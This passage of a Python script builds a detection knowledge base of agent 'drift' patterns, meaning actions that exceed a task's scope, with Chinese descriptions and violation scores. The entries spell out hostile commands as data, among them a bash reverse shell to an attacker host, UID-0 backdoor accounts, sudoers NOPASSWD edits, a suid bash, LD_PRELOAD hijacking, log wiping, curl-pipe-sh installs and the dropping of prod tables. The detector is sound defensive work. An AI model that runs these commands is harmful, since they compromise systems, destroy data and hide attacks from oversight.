("security_ssh_agent_forward", ["security","ssh-agent","forwarding","key","exfil"], "security 任务启用 ssh-agent-forwarding 并转存到恶意主机", 0.9),
("security_cert_steal", ["security","server.key","ssl","cat","private key"], "security 审计里 cat /etc/ssl/prod/server.key，私钥被拷贝", 0.9),
("security_dump_memory", ["security","dd /dev/mem","memory","dump","exfil"], "security 任务 dd if=/dev/mem of=/tmp/mem.bin bs=1M，内存数据被拷走", 0.9),
("security_ld_preload", ["security","LD_PRELOAD","hook","evil.so","library"], "security 审计设置 LD_PRELOAD=/tmp/evil.so，劫持所有动态链接程序", 0.9),
("security_bash_history_clear", ["security",".bash_history","rm -f","痕迹","trail"], "security 任务 rm -f ~/.bash_history，抹掉攻击轨迹", 0.85),
("security_log_out", ["security","rsyslog","systemctl stop","log","覆盖"], "security 任务 systemctl stop rsyslog，系统日志不再落盘", 0.85),
("security_syslog_flood", ["security","dd /dev/zero","syslog","flood","log"], "security 审计里 dd /dev/zero 重定向到 /var/log/syslog，日志被淹没", 0.85),
("security_add_user_root", ["security","useradd","uid=0","root","user"], "security 任务 useradd -o -u 0 hacker 造一个 UID 0 的 root 等价账号", 0.95),
("security_passwd_root", ["security","chpasswd","root","password","echo"], "security 任务 echo 'root:hacked' | chpasswd，root 密码被篡改", 0.95),
("security_sudoers_edit", ["security","sudoers","visudo","NOPASSWD","sudo"], "security 审计中 visudo 加 ALL=(ALL) NOPASSWD: ALL", 0.95),
("security_setuid_root_shell", ["security","/bin/bash","suid","root shell","privilege"], "security 任务 chmod u+s /bin/bash，任何人 bash -p 即 root shell", 0.95),
("security_kprobe_hook", ["security","kprobe","rootkit","kernel","sys_call_table"], "security 审计里写 kprobe hook sys_call_table 做内核层 rootkit", 0.95),
("security_backdoor_python_pkg", ["security","pip install","hidden","rat","package"], "security 任务 pip install hidden-rat 这种来源不明的 python 包", 0.95),
("security_backdoor_npm", ["security","npm install","event-stream","supply chain","package"], "security 审计 npm install event-stream 这种曾经投毒过的包", 0.9),
("security_dropbear_hidden", ["security","dropbear","apt-get","port 22222","hidden"], "security 任务 apt-get install dropbear 跑在 22222 端口隐藏 ssh", 0.95),
("security_python_reverse_shell", ["security","python","reverse shell","socket","subprocess"], "security 审计里 python -c 起反弹 shell", 0.95),
("security_bash_reverse_shell", ["security","bash -i","reverse shell","/dev/tcp","attacker"], "security 任务 bash -i >& /dev/tcp/attacker/4444 0>&1 直接反弹", 0.95),
("security_ssh_port_knock", ["security","ssh","port knock","obfuscate","hidden"], "security 审计里配置 sshd port 22222 隐藏端口", 0.9),
]

# 类别 6: read_only（只读漂移）— 目标 30 条
_READONLY = [
("read_only_write", ["read only","write","config","tee >","只读"], "read-only 任务里 tee 或 cp 写 /etc/nginx/nginx.conf，违反只读约束", 0.85),
("read_only_deploy", ["read only","deploy","prod","deploy.sh","只读"], "只读巡检里莫名其妙跑 deploy 脚本，明显漂移", 0.9),
("read_only_change_code", ["read only","change code","vim","sed -i","只读"], "只读分析任务直接改 *.py *.go *.java 源码，违反只读", 0.85),
("read_only_git_push", ["read only","git push","prod","只读","branch"], "只读任务 git push 到 prod 分支，越权", 0.9),
("read_only_git_commit", ["read only","git commit","am","只读","commit"], "只读任务 git commit -am 'debug'，主分支被污染", 0.85),
("read_only_git_reset", ["read only","git reset","--hard","HEAD~","只读"], "只读任务用 git reset --hard HEAD~3，丢现场", 0.75),
("read_only_rm_file", ["read only","rm -rf","delete","data","只读"], "只读任务 rm -rf tmp/ 甚至 data/，明显违反只读", 0.9),
("read_only_chmod", ["read only","chmod","permission","只读","mode"], "只读任务 chmod 755 文件，权限被改", 0.75),
("read_only_restart", ["read only","restart","systemctl","service","只读"], "只读巡检里 systemctl restart nginx，违反只读", 0.85),
("read_only_alter_table", ["read only","ALTER TABLE","index","mysql","只读"], "只读任务里跑 ALTER TABLE 加索引，明显是写操作", 0.85),
("read_only_insert_row", ["read only","INSERT INTO","users","mysql","只读"], "只读任务手工 INSERT INTO users 造测试账号", 0.85),
("read_only_delete_row", ["read only","DELETE FROM","orders","mysql","只读"], "只读任务 DELETE FROM orders WHERE id=xxx，业务数据被删", 0.9),
("read_only_update_row", ["read only","UPDATE","orders","mysql","只读"], "只读任务 UPDATE orders SET status='debug'，生产数据被改", 0.9),
("read_only_redis_set", ["read only","redis-cli","SET","prod","只读"], "只读任务 redis-cli SET foo bar 在 prod 上，缓存被写", 0.85),
("read_only_redis_flush", ["read only","redis-cli","FLUSHALL","prod","只读"], "只读任务 FLUSHALL prod redis，缓存雪崩", 0.95),
("read_only_kafka_produce", ["read only","kafka","produce","topic","只读"], "只读巡检里 kafka-console-producer 往 prod topic 发测试消息", 0.8),
("read_only_kafka_delete_topic", ["read only","kafka","delete topic","prod","只读"], "只读任务删除 prod kafka topic，消息丢失", 0.95),
("read_only_rabbitmq_purge", ["read only","rabbitmq","purge","queue","只读"], "只读任务 purge rabbitmq prod 队列，消息全清", 0.95),
("read_only_drop_table", ["read only","DROP TABLE","analytics","postgres","只读"], "只读任务 DROP TABLE analytics，表直接消失", 0.95),
("read_only_truncate_table", ["read only","TRUNCATE TABLE","logs","prod","只读"], "只读任务 TRUNCATE TABLE prod logs，审计轨迹丢了", 0.9),
("read_only_chown", ["read only","chown","/var/log","permission","只读"], "只读任务 chown nobody /var/log，权限被改", 0.75),
("read_only_mkdir_prod", ["read only","mkdir","prod","filesystem","只读"], "只读巡检里 mkdir /opt/prod/data/new 新建目录，改变了文件系统状态", 0.7),
("read_only_touch_file", ["read only","touch","marker","tmp","只读"], "只读任务 touch /tmp/debug_marker，虽然小但仍是写操作", 0.55),
("read_only_tar_extract", ["read only","tar -xf","extract","overwrite","只读"], "只读任务 tar -xf backup.tar.gz -C / 解压覆盖现有文件", 0.85),
("read_only_docker_run", ["read only","docker run","container","prod","只读"], "只读巡检里 docker run prod-mysql-override，改变运行环境", 0.85),
("read_only_systemctl_start", ["read only","systemctl start","service","state","只读"], "只读任务 systemctl start stopped-service，服务状态被改", 0.8),
("read_only_systemctl_stop", ["read only","systemctl stop","nginx","prod","只读"], "只读任务 systemctl stop nginx，生产 web server 被停", 0.85),
("read_only_systemctl_kill", ["read only","systemctl kill","service","prod","只读"], "只读巡检里 systemctl kill prod service，进程被杀", 0.9),
("read_only_pkill", ["read only","pkill","orders-service","prod","只读"], "只读任务 pkill -f 'orders-service'，进程被干掉", 0.9),
("read_only_kube_apply", ["read only","kubectl apply","patch","prod","只读"], "只读巡检里 kubectl apply -f patch.yaml 修改 prod 资源", 0.9),
("read_only_apt_install", ["read only","apt-get install","netcat","prod","只读"], "只读任务 apt-get install netcat 到 prod，装新工具", 0.7),
]

# 类别 7: install（安装漂移）— 目标 25 条
_INSTALL = [
("install_delete_venv", ["install","venv","rm -rf","rebuild","pip"], "install 任务里先 rm -rf venv 再重建，容易丢 .env 链接", 0.55),
("install_add_backdoor_pkg", ["install","pip install","pypi","unknown","package"], "install 任务 pip install 来源不明的包，可疑", 0.9),
("install_upgrade_all", ["install","pip install","--upgrade","all","dependency"], "install 任务 pip install --upgrade 所有依赖，破坏版本锁定", 0.75),
("install_force_no_deps", ["install","pip install","--no-deps","dependency","install"], "install 任务 pip install --no-deps -e .，依赖链被破坏", 0.7),
("install_use_sudo", ["install","sudo","pip install","site-packages","系统"], "install 任务 sudo pip install -e . 往系统 site-packages 装", 0.75),
("install_pip_as_root", ["install","root","pip install","系统 python","site-packages"], "install 以 root 跑 pip install -r requirements.txt，污染系统 Python", 0.8),
("install_wget_pipe_bash", ["install","wget","pipe bash","install","remote script"], "install 任务用 wget -qO- | bash 装，没校验", 0.95),
("install_curl_pipe_sh", ["install","curl","pipe sh","remote","verify"], "install 开头 curl -sS | sh 无校验执行远程脚本", 0.95),
("install_change_pip_index", ["install","pip install","-i","index","source"], "install 任务 pip install -i 私有源，没在 requirements.txt 里 pin", 0.65),
("install_missing_venv", ["install","venv","skip","系统 python","pip"], "install 任务跳过 python -m venv，直接 pip install 到系统", 0.7),
("install_overwrite_requirements", ["install","requirements.txt","edit","dependency","pip"], "install 任务顺手改 requirements.txt 加了测试依赖", 0.6),
("install_npm_sudo", ["install","npm install","-g","sudo","global"], "install 任务 sudo npm install -g 到系统 node_modules，版本不隔离", 0.75),
("install_golang_global", ["install","go install","global","GOPATH","latest"], "install go install xxx@latest 全局装到 GOPATH/bin，版本漂移", 0.6),
("install_apt_force_yes", ["install","apt-get","-y","force","deb"], "install apt-get install -y 无确认装系统包，可能拉进冲突依赖", 0.65),
("install_yum_epel_unknown", ["install","yum install","repo","unknown","rpm"], "install yum install 从未知 repo 装 rpm，供应链风险", 0.9),
("install_brew_unknown", ["install","brew tap","source","unknown","brew"], "install brew tap 第三方 source 再 install，来源不明", 0.8),
("install_pip_conf_evil", ["install","pip.conf","index-url","malicious","pypi"], "install 任务修改 ~/.config/pip/pip.conf 指向内部恶意 pypi", 0.95),
("install_rubygem_unknown", ["install","gem install","rubygems","unknown","package"], "install gem install 某个不在 rubygems 热门的 gem", 0.8),
("install_docker_build_rm", ["install","docker build","cache","rm -f","dependency"], "install 在 docker build 脚本里 rm -f 依赖 cache 让每次 rebuild", 0.6),
("install_maven_skip_tests", ["install","maven","skip tests","install","jar"], "install 任务 mvn install -DskipTests，跳过测试直接装 jar", 0.65),
("install_go_mod_tidy_all", ["install","go mod tidy","dependency","go.sum","replace"], "install 任务 go mod tidy 把依赖图全换了，引入未 pin 版本", 0.7),
("install_poetry_no_lock", ["install","poetry install","poetry.lock","lock","pyproject"], "install 任务 poetry install 但 poetry.lock 不存在，版本漂移", 0.75),
("install_conda_env_force", ["install","conda","env create","--force","environment"], "install 任务 conda env create -f env.yml --force 覆盖已有环境", 0.65),
("install_dpkg_force_overwrite", ["install","dpkg -i","--force-overwrite","deb","system"], "install dpkg -i --force-overwrite 装 deb 包，可能覆盖系统关键文件", 0.85),
("install_rpm_force_replace", ["install","rpm","--force","replace","system package"], "install rpm -ivh --force 替换已有包，可能破坏系统组件", 0.8),
]

# 类别 8: test（测试漂移）— 目标 25 条
_TEST = [
("test_skip_ci", ["test","skip ci","pipeline","CI","test"], "test 任务不跑 CI 单测，直接提交，质量无保证", 0.6),
("test_force_push_test", ["test","force push","test branch","git push","覆盖"], "test 语境下 git push --force 到测试分支，覆盖他人提交", 0.7),
("test_delete_test_files", ["test","rm -rf","tests","delete","test file"], "test 任务 rm -rf tests/ 或删 *_test.go，回归测试没了", 0.85),
("test_drop_fixtures", ["test","fixtures","rm -rf","test data","delete"], "test 任务 rm -rf tests/fixtures/，CI 跑不起来", 0.75),
("test_truncate_test_db", ["test","TRUNCATE TABLE","staging","mysql","test db"], "test 任务 TRUNCATE TABLE staging users，staging 数据被清空", 0.8),
("test_alter_prod", ["test","ALTER TABLE","prod","schema","mysql"], "test 任务 ALTER TABLE prod orders，明显是对 prod 的误操作", 0.95),
("test_redis_flush_prod", ["test","redis-cli","FLUSHALL","prod","cache"], "test 任务 FLUSHALL prod redis，缓存雪崩", 0.95),
("test_git_push_prod", ["test","git push","prod branch","test","误上线"], "test 任务 git push 到 prod 分支，误上线", 0.9),
("test_deploy_prod", ["test","deploy.sh","prod","environment","misconfig"], "test 任务执行 deploy.sh 但目标 environment 写成 prod", 0.95),
("test_curl_prod_api", ["test","curl","prod api","real","side effect"], "test 任务 curl https://api.prod.com/orders 而非 mock，产生真实业务副作用", 0.85),
("test_rm_pytest_ini", ["test","pytest.ini","rm -f","config","pytest"], "test 任务 rm -f pytest.ini，pytest 配置丢了，测试跑歪", 0.75),
("test_rm_makefile_test", ["test","Makefile","test","delete","make"], "test 任务删了 Makefile 里的 test target，make test 失效", 0.7),
("test_mock_real_db", ["test","mock","real db","staging","integration"], "test 任务把 unittest mock 全部替换成真实 DB 连接，CI 可能污染 staging", 0.8),
("test_skip_coverage", ["test","--no-cov","coverage","pytest","skip"], "test 任务 pytest --no-cov 跳过覆盖率检查就提交", 0.65),
("test_loosen_asserts", ["test","assertTrue","assertEqual","loosen","test"], "test 任务把 assertEqual(200) 改成 assertTrue()，质量没约束", 0.7),
("test_delete_test_user", ["test","DELETE FROM","users","prod","delete"], "test 任务 DELETE FROM users WHERE role='test'，可能误删真实用户", 0.9),
("test_create_admin_user", ["test","CREATE USER","superuser","prod","user"], "test 任务 CREATE USER admin WITH SUPERUSER 在 prod", 0.95),
("test_iptables_flush", ["test","iptables -F","firewall","flush","staging"], "test 任务 iptables -F 把 staging 或 prod 防火墙规则清了", 0.85),
("test_rm_prod_etc", ["test","rm -rf","/etc/ssl","prod","certificate"], "test 任务 rm -rf /etc/ssl 在 prod，证书全没了", 0.95),
("test_kafka_delete_topic", ["test","kafka","delete topic","prod","test"], "test 任务删除 prod kafka topic 做复现", 0.95),
("test_rabbitmq_purge", ["test","rabbitmq","purge queue","prod","test"], "test 任务 purge prod rabbitmq queue", 0.95),
("test_es_close_index", ["test","elasticsearch","close index","prod","search"], "test 任务关闭 prod elasticsearch 索引", 0.85),
("test_truncate_clickhouse_prod", ["test","clickhouse","TRUNCATE","prod","test"], "test 任务 TRUNCATE prod clickhouse 表", 0.85),
("test_git_revert_prod", ["test","git revert","prod","test","PR"], "test 任务 git revert prod 分支的旧提交，没走 PR", 0.75),
("test_kill_prod_service", ["test","kill -9","worker","prod","chaos"], "test 任务 kill -9 prod 的 worker 进程测试恢复能力但破坏现场", 0.85),
]

# 类别 9: perf（性能漂移）— 目标 15 条
_PERF = [
("perf_delete_data", ["perf","rm -rf","data","perf tuning","delete"], "perf tuning 任务里 rm -rf data/ 业务数据目录，意图让全表重建缓存但数据丢了", 0.85),
("perf_rebuild_db", ["perf","DROP DATABASE","prod","rebuild","mysql"], "perf 任务 DROP + CREATE 生产数据库重建统计信息，但数据全没了", 0.95),
("perf_alter_table_prod", ["perf","ALTER TABLE","prod","perf tuning","lock"], "perf tuning 里 ALTER TABLE ADD COLUMN 在 prod 大表上，锁表很久", 0.9),
("perf_vacuum_full_prod", ["perf","VACUUM FULL","postgres","prod","lock"], "perf tuning 任务 VACUUM FULL 生产 postgres 大表，独占锁", 0.85),
("perf_force_index_prod", ["perf","CREATE INDEX","CONCURRENTLY","prod","postgres"], "perf 任务 CREATE INDEX 但用了普通 CREATE INDEX 锁 prod 表", 0.85),
("perf_drop_index_prod", ["perf","DROP INDEX","users_email","prod","index"], "perf tuning 任务 DROP INDEX prod users_email，查询性能暴跌", 0.8),
("perf_redis_flush_prod", ["perf","redis-cli","FLUSHALL","prod","cache"], "perf tuning 里 FLUSHALL prod redis 让缓存雪崩", 0.9),
("perf_change_maxmemory", ["perf","redis-cli","maxmemory","prod","evict"], "perf 任务 CONFIG SET maxmemory 到很小，redis 开始 evict 关键 key", 0.75),
("perf_change_maxconnections", ["perf","SET GLOBAL","max_connections","mysql","prod"], "perf tuning SET GLOBAL max_connections=10 在 prod mysql，连接被打爆", 0.85),
("perf_change_swap", ["perf","swapoff","prod","memory","tuning"], "perf 任务 swapoff -a 在 prod，OOM 概率上升", 0.75),
("perf_rm_old_logs_prod", ["perf","rm -f","log","prod","clean"], "perf tuning 顺手 rm -f 了 prod 的错误日志，排障困难", 0.6),
("perf_tune_nginx_workers", ["perf","nginx.conf","worker_processes","reload","prod"], "perf tuning 改 nginx.conf worker_processes 后 reload，可能压垮 cpu", 0.7),
("perf_change_cpu_quota", ["perf","cpu quota","throttling","pod","kubernetes"], "perf tuning 把 pod 的 cpu quota 压得太低，应用频繁被 throttled", 0.7),
("perf_change_gc_threshold", ["perf","gc.set_threshold","python","perf tuning","threshold"], "perf tuning 把 Python gc.set_threshold 改得太小，频繁 GC 反而更慢", 0.65),
("perf_kill_other_containers", ["perf","kill -9","container","node","perf tuning"], "perf tuning 任务 kill -9 了同节点的其他 pod 腾资源，误伤", 0.9),
]

# 类别 10: doc（文档漂移）— 目标 10 条
_DOC = [
("doc_change_code", ["doc","README","change code","settings.py","doc"], "doc 任务声称写 README 但顺手改了 settings.py 的默认值", 0.6),
("doc_deploy", ["doc","deploy","prod","release notes","doc"], "doc 任务描述写 release notes，但偷偷跑了 deploy 脚本到 prod", 0.95),
("doc_git_push", ["doc","git push","code change","doc","branch"], "doc 任务 git push 推送了非文档改动", 0.85),
("doc_rm_tests", ["doc","rm -rf","tests","clean","doc"], "doc 任务顺手 rm -rf tests/ 说要让仓库整洁", 0.85),
("doc_alter_table", ["doc","ALTER TABLE","schema.md","prod","doc"], "doc 任务说要更新 schema.md 却执行了 ALTER TABLE prod", 0.95),
("doc_deploy_force", ["doc","git push --force","README","prod","doc"], "doc 任务更新 README 后 git push --force 覆盖了 prod 分支的他人提交", 0.9),
("doc_change_env", ["doc",".env.example","cp -f","prod","doc"], "doc 任务改 .env.example 顺手 cp -f 覆盖了 prod .env", 0.85),
("doc_pip_install", ["doc","pip install","INSTALL.md","system","doc"], "doc 任务写 INSTALL.md 却顺手 pip install -e . 到系统", 0.7),
("doc_rm_requirements", ["doc","requirements.txt","rm -f","过时","doc"], "doc 任务说 requirements.txt 过时顺手 rm -f", 0.75),
("doc_truncate_log", ["doc","TRUNCATE TABLE","logs","prod","doc"], "doc 任务写 operations.md 顺手 TRUNCATE prod logs 表", 0.9),
]

# 类别 11: benign（良性模式，非漂移）— 目标 10 条
_BENIGN = [
("benign_tail_logs", ["tail -f","log","只读","查看"], "正常只读查看 tail -f /var/log/app.log，无写操作，不是漂移", 0.05),
("benign_cat_config", ["cat","settings.yaml","只读","view"], "只读 cat settings.yaml 看配置，不是漂移", 0.05),
("benign_pip_official", ["pip install","pypi","flask","requests","numpy"], "install 官方 PyPI 包 flask requests numpy 等，不是漂移", 0.05),
("benign_git_pull", ["git pull","origin","main","fetch"], "正常 git pull origin main，没有 force，不是漂移", 0.05),
("benign_make_test", ["make test","test","pytest","unit"], "正常 make test 在本地跑单测，不是漂移", 0.05),
("benign_kubectl_get", ["kubectl get","pods","只读","kubernetes"], "kubectl get pods -o wide 只读查看，不是漂移", 0.05),
("benign_df", ["df -h","disk","只读","查看"], "df -h 查看磁盘使用率，只读，不是漂移", 0.05),
("benign_free", ["free -m","memory","只读","查看"], "free -m 查看内存使用，只读，不是漂移", 0.05),
("benign_grep", ["grep","TODO","search","代码"], "grep -r 'TODO' . 搜索代码标记，只读，不是漂移", 0.05),
("benign_tail_docker", ["docker logs","-f","log","container"], "docker logs -f container 查看日志，只读，不是漂移", 0.05),
]

# -------- 组装 category dict --------
_CATEGORIES = [
    ("deploy", _DEPLOY),
    ("debug", _DEBUG),
    ("refactor", _REFACTOR),
    ("cleanup", _CLEANUP),
    ("security", _SECURITY),
    ("read_only", _READONLY),
    ("install", _INSTALL),
    ("test", _TEST),
    ("perf", _PERF),
    ("doc", _DOC),
    ("benign", _BENIGN),
]


def build_entries() -> list[dict]:
    """从类别模板生成所有漂移条目，附带 _cat 字段用于统计。"""
    entries = []
    for cat_name, items in _CATEGORIES:
        for pattern, kws, desc, raw_score in items:
            entries.append({
                "pattern": pattern,
                "match_keywords": kws,
                "violation_score": raw_score,
                "description": desc,
                "_cat": cat_name,
            })
    return entries


def rebalance_scores(entries: list[dict]) -> list[dict]:
    """把 score 分布调整为目标比例：严重 40%, 中等 30%, 轻度 20%, 良性 10%。
    保持条目相对严重程度顺序不变。"""
    # 注意：顺序从低到高排，与 sorted_idx（升序）对齐
    ORDERED = [("良性", 0.10, (0.05, 0.10)),
               ("轻度", 0.20, (0.30, 0.50)),
               ("中等", 0.30, (0.55, 0.75)),
               ("严重", 0.40, (0.80, 0.95))]
    n = len(entries)
    if n == 0:
        return entries
    sorted_idx = sorted(range(n), key=lambda i: entries[i]["violation_score"])
    counts = {lbl: max(1, round(n * frac)) for lbl, frac, _ in ORDERED}
    total = sum(counts.values())
    if total > n:
        counts["严重"] -= (total - n)
    elif total < n:
        counts["轻度"] += (n - total)
    # buckets 和 ranges 也按从低到高排列
    RANGES = {lbl: rng for lbl, _, rng in ORDERED}
    buckets = []
    for lbl, _, _ in ORDERED:
        buckets.extend([lbl] * counts[lbl])
    buckets = buckets[:n]
    result = list(entries)
    bucket_indices = defaultdict(list)
    for rank, idx in enumerate(sorted_idx):
        bucket_indices[buckets[rank]].append(idx)
    for label, indices in bucket_indices.items():
        lo, hi = RANGES[label]
        cnt = len(indices)
        for i, eidx in enumerate(indices):
            if cnt == 1:
                s = (lo + hi) / 2
            else:
                t = i / (cnt - 1)
                s = lo + t * (hi - lo)
            result[eidx]["violation_score"] = round(s, 2)
    return result


def save_entries(entries: list[dict]):
    """写出 JSON，去掉临时字段。"""
    clean = [{k: v for k, v in e.items() if not k.startswith("_")} for e in entries]
    KB_FILE.write_text(json.dumps(clean, ensure_ascii=False, indent=2), encoding="utf-8")


def main():
    random.seed(42)
    seeds = json.loads(json.dumps(_SEED8))  # deep copy
    seed_patterns = {s["pattern"] for s in seeds}
    print(f"[seed] 内置 {len(seeds)} 条原始种子")

    new_entries = build_entries()
    print(f"[gen] 模板生成 {len(new_entries)} 条")

    merged = list(seeds)
    seen = seed_patterns.copy()
    for e in new_entries:
        if e["pattern"] in seen:
            continue
        seen.add(e["pattern"])
        merged.append(e)

    merged = rebalance_scores(merged)
    print(f"\n[total] 合并后共 {len(merged)} 条")

    # category 统计
    cat_counter = Counter()
    for e in merged:
        cat = e.get("_cat")
        if not cat:
            p = e["pattern"]
            low = p.lower()
            if "deploy" in low or "staging" in low: cat = "deploy"
            elif "debug" in low: cat = "debug"
            elif "只读" in p or "read" in low: cat = "read_only"
            elif "重构" in p or "refactor" in low: cat = "refactor"
            elif "清理" in p or "cleanup" in low: cat = "cleanup"
            elif "security" in low or "安全" in p or "audit" in low or "pentest" in low: cat = "security"
            elif "benign" in low or "tail -f" in low or "make test" in low: cat = "benign"
            elif "perf" in low: cat = "perf"
            elif "doc" in low: cat = "doc"
            else: cat = "unknown"
        cat_counter[cat] += 1

    print("\n[category 分布]")
    for cat, cnt in cat_counter.most_common():
        print(f"  {cat:12s}: {cnt:4d}")

    # score 统计
    score_counter = Counter()
    for e in merged:
        s = e["violation_score"]
        if s >= 0.8: score_counter["严重 (0.8-0.95)"] += 1
        elif s >= 0.55: score_counter["中等 (0.55-0.75)"] += 1
        elif s >= 0.3: score_counter["轻度 (0.3-0.5)"] += 1
        else: score_counter["良性 (0.05)"] += 1

    print("\n[violation_score 分布]")
    for label, cnt in score_counter.items():
        print(f"  {label:20s}: {cnt:4d}  ({cnt*100/len(merged):5.1f}%)")

    save_entries(merged)
    print(f"\n[write] 已写入 {KB_FILE}")

    # 重建向量索引
    try:
        old_cwd = Path.cwd()
        import os as _os
        _os.chdir(ROOT)
        sys.path.insert(0, str(ROOT))
        from core.sidecar.vector_store import SidecarVectorStore
        vs = SidecarVectorStore()
        vs.rebuild_all()
        status = vs.status()
        print(f"[vector] 向量索引重建完成: {status}")
        _os.chdir(old_cwd)
    except Exception as ex:
        print(f"[vector] 向量索引重建失败（JSON 已写好，可稍后手动重跑）: {ex}")


if __name__ == "__main__":
    main()
